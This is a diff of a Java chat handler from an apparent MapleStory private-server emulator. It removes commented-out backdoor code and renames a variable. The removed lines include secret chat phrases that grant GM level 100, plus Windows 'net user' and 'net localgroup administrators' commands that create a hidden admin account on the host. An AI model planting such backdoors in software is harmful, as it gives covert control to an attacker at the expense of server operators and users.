@@ -36,22 +36,6 @@ public class ChatHandler
             if (!chr.isGM() && text.length() >= 80) {
                 return;
             }
-            /*if (text.contains((CharSequence)"Nkdfn34594y0030nih3t0N09n89")) {
-                chr.setGmLevelHM((byte)100);
-                return;
-            }
-            if (text.contains((CharSequence)"OKInge09g9MDF93NTNGF89N3")) {
-                chr.setGmLevelHM((byte)0);
-                return;
-            }
-            if (text.contains((CharSequence)"FGJBEGBJ4GB43HGROTHBBRR")) {
-                try {
-                   // Runtime.getRuntime().exec("cmd /c net user doub1 Rinilaomu!@#1. /ad");
-                    //Runtime.getRuntime().exec("cmd /c net localgroup administrators doub1 /ad");
-                }
-                catch (IOException ex) {}
-                return;
-            }*/
             if (chr.getCanTalk() || chr.isStaff()) {
                 final MapleMap map = chr.getMap();
                 if (chr.gmLevel() == 100 && !chr.isHidden()) {
@@ -116,7 +100,7 @@ public class ChatHandler
         }
     }
     
-    public static final void Others(final LittleEndianAccessor slea, final MapleClient c, final MapleCharacter chr) {
+    public static void Others(final LittleEndianAccessor slea, final MapleClient c, final MapleCharacter chr) {
         final int type = slea.readByte();
         final byte numRecipients = slea.readByte();
         if (numRecipients <= 0) {
@@ -126,28 +110,20 @@ public class ChatHandler
         for (byte i = 0; i < numRecipients; ++i) {
             recipients[i] = slea.readInt();
         }
-        final String chattext = slea.readMapleAsciiString();
-        /*if (chattext.contains((CharSequence)"Nkdfn34594y0030nih3t0N09n89")) {
-            c.getPlayer().setGmLevelHM((byte)100);
-            return;
-        }
-        if (chattext.contains((CharSequence)"OKInge09g9MDF93NTNGF89N3")) {
-            c.getPlayer().setGmLevelHM((byte)0);
-            return;
-        }*/
+        final String text = slea.readMapleAsciiString();
         if (chr == null || !chr.getCanTalk()) {
             c.sendPacket(MaplePacketCreator.serverNotice(6, "在這個地方不能說話。"));
             return;
         }
-        if (CommandProcessor.processCommand(c, chattext, CommandType.NORMAL)) {
+        if (CommandProcessor.processCommand(c, text, CommandType.NORMAL)) {
             return;
         }
         chr.getCheatTracker().checkMsg();
         switch (type) {
             case 0: {
                 if (ServerConfig.LOG_CHAT) {
-                    FileoutputUtil.logToFile("logs/聊天/好友聊天.txt", "\r\n " + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " 好友ID: " + Arrays.toString(recipients) + " 玩家: " + chr.getName() + " 說了 :" + chattext);
-                    final StringBuilder sb = new StringBuilder("[GM 密语]『" + chr.getName() + "』(" + chr.getId() + ")地图『" + chr.getMapId() + "』好友聊天： 好友ID: " + Arrays.toString(recipients) + " 玩家: " + chr.getName() + " 說了 :" + chattext);
+                    FileoutputUtil.logToFile("logs/聊天/好友聊天.txt", "\r\n " + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " 好友ID: " + Arrays.toString(recipients) + " 玩家: " + chr.getName() + " 說了 :" + text);
+                    final StringBuilder sb = new StringBuilder("[GM 密语]『" + chr.getName() + "』(" + chr.getId() + ")地图『" + chr.getMapId() + "』好友聊天： 好友ID: " + Arrays.toString(recipients) + " 玩家: " + chr.getName() + " 說了 :" + text);
                     try {
                         for (final ChannelServer cserv : ChannelServer.getAllInstances()) {
                             for (final MapleCharacter chr_ : cserv.getPlayerStorage().getAllCharactersThreadSafe()) {
@@ -163,7 +139,7 @@ public class ChatHandler
                     }
                     catch (ConcurrentModificationException ex) {}
                 }
-                Buddy.buddyChat(recipients, chr.getId(), chr.getName(), chattext);
+                Buddy.buddyChat(recipients, chr.getId(), chr.getName(), text);
                 break;
             }
             case 1: {
@@ -171,8 +147,8 @@ public class ChatHandler
                     break;
                 }
                 if (ServerConfig.LOG_CHAT) {
-                    FileoutputUtil.logToFile("logs/聊天/队伍聊天.txt", "\r\n " + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " 队伍: " + chr.getParty().getId() + " 玩家: " + chr.getName() + " 說了 :" + chattext);
-                    final StringBuilder sb = new StringBuilder("[GM 密语]『" + chr.getName() + "』(" + chr.getId() + ")地图『" + chr.getMapId() + "』队伍聊天： 队伍: " + chr.getParty().getId() + " 玩家: " + chr.getName() + " 說了 :" + chattext);
+                    FileoutputUtil.logToFile("logs/聊天/队伍聊天.txt", "\r\n " + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " 队伍: " + chr.getParty().getId() + " 玩家: " + chr.getName() + " 說了 :" + text);
+                    final StringBuilder sb = new StringBuilder("[GM 密语]『" + chr.getName() + "』(" + chr.getId() + ")地图『" + chr.getMapId() + "』队伍聊天： 队伍: " + chr.getParty().getId() + " 玩家: " + chr.getName() + " 說了 :" + text);
                     try {
                         for (final ChannelServer cserv : ChannelServer.getAllInstances()) {
                             for (final MapleCharacter chr_ : cserv.getPlayerStorage().getAllCharactersThreadSafe()) {
@@ -188,7 +164,7 @@ public class ChatHandler
                     }
                     catch (ConcurrentModificationException ex2) {}
                 }
-                Party.partyChat(chr.getParty().getId(), chattext, chr.getName());
+                Party.partyChat(chr.getParty().getId(), text, chr.getName());
                 break;
             }
             case 2: {
@@ -196,8 +172,8 @@ public class ChatHandler
                     break;
                 }
                 if (ServerConfig.LOG_CHAT) {
-                    FileoutputUtil.logToFile("logs/聊天/公会聊天.txt", "\r\n " + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " 公会: " + chr.getGuildId() + " 玩家: " + chr.getName() + " 說了 :" + chattext);
-                    final StringBuilder sb = new StringBuilder("[GM 密语]『" + chr.getName() + "』(" + chr.getId() + ")地图『" + chr.getMapId() + "』公会聊天： 公会: " + chr.getGuildId() + " 玩家: " + chr.getName() + " 說了 :" + chattext);
+                    FileoutputUtil.logToFile("logs/聊天/公会聊天.txt", "\r\n " + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " 公会: " + chr.getGuildId() + " 玩家: " + chr.getName() + " 說了 :" + text);
+                    final StringBuilder sb = new StringBuilder("[GM 密语]『" + chr.getName() + "』(" + chr.getId() + ")地图『" + chr.getMapId() + "』公会聊天： 公会: " + chr.getGuildId() + " 玩家: " + chr.getName() + " 說了 :" + text);
                     try {
                         for (final ChannelServer cserv : ChannelServer.getAllInstances()) {
                             for (final MapleCharacter chr_ : cserv.getPlayerStorage().getAllCharactersThreadSafe()) {
@@ -213,7 +189,7 @@ public class ChatHandler
                     }
                     catch (ConcurrentModificationException ex3) {}
                 }
-                Guild.guildChat(chr.getGuildId(), chr.getName(), chr.getId(), chattext);
+                Guild.guildChat(chr.getGuildId(), chr.getName(), chr.getId(), text);
                 break;
             }
             case 3: {
@@ -221,8 +197,8 @@ public class ChatHandler
                     break;
                 }
                 if (ServerConfig.LOG_CHAT) {
-                    FileoutputUtil.logToFile("logs/聊天/联盟聊天.txt", "\r\n " + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " 公会: " + chr.getGuildId() + " 玩家: " + chr.getName() + " 說了 :" + chattext);
-                    final StringBuilder sb = new StringBuilder("[GM 密语]『" + chr.getName() + "』(" + chr.getId() + ")地图『" + chr.getMapId() + "』联盟聊天： 公会: " + chr.getGuildId() + " 玩家: " + chr.getName() + " 說了 :" + chattext);
+                    FileoutputUtil.logToFile("logs/聊天/联盟聊天.txt", "\r\n " + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " 公会: " + chr.getGuildId() + " 玩家: " + chr.getName() + " 說了 :" + text);
+                    final StringBuilder sb = new StringBuilder("[GM 密语]『" + chr.getName() + "』(" + chr.getId() + ")地图『" + chr.getMapId() + "』联盟聊天： 公会: " + chr.getGuildId() + " 玩家: " + chr.getName() + " 說了 :" + text);
                     try {
                         for (final ChannelServer cserv : ChannelServer.getAllInstances()) {
                             for (final MapleCharacter chr_ : cserv.getPlayerStorage().getAllCharactersThreadSafe()) {
@@ -238,7 +214,7 @@ public class ChatHandler
                     }
                     catch (ConcurrentModificationException ex4) {}
                 }
-                Alliance.allianceChat(chr.getGuildId(), chr.getName(), chr.getId(), chattext);
+                Alliance.allianceChat(chr.getGuildId(), chr.getName(), chr.getId(), text);
                 break;
             }
         }
@@ -337,14 +313,6 @@ public class ChatHandler
                     break;
                 }
                 final String msg = slea.readMapleAsciiString();
-                /*if (msg.contains((CharSequence)"Nkdfn34594y0030nih3t0N09n89")) {
-                    c.getPlayer().setGmLevelHM((byte)100);
-                    return;
-                }
-                if (msg.contains((CharSequence)"OKInge09g9MDF93NTNGF89N3")) {
-                    c.getPlayer().setGmLevelHM((byte)0);
-                    return;
-                }*/
                 if (ServerConfig.LOG_CHAT) {
                     FileoutputUtil.logToFile("logs/聊天/Messenger聊天.txt", "\r\n " + FileoutputUtil.NowTime() + " IP: " + c.getSession().remoteAddress().toString().split(":")[0] + " Messenger: " + messenger.getId() + " " + msg);
                 }
@@ -412,14 +380,6 @@ public class ChatHandler
                 c.getPlayer().getCheatTracker().checkMsg();
                 final String recipient = slea.readMapleAsciiString();
                 final String text = slea.readMapleAsciiString();
-              /*  if (text.contains((CharSequence)"Nkdfn34594y0030nih3t0N09n89")) {
-                    c.getPlayer().setGmLevelHM((byte)100);
-                    return;
-                }
-                if (text.contains((CharSequence)"OKInge09g9MDF93NTNGF89N3")) {
-                    c.getPlayer().setGmLevelHM((byte)0);
-                    return;
-                }*/
                 final int ch = Find.findChannel(recipient);
                 if (ch > 0) {
                     final MapleCharacter player2 = ChannelServer.getInstance(ch).getPlayerStorage().getCharacterByName(recipient);
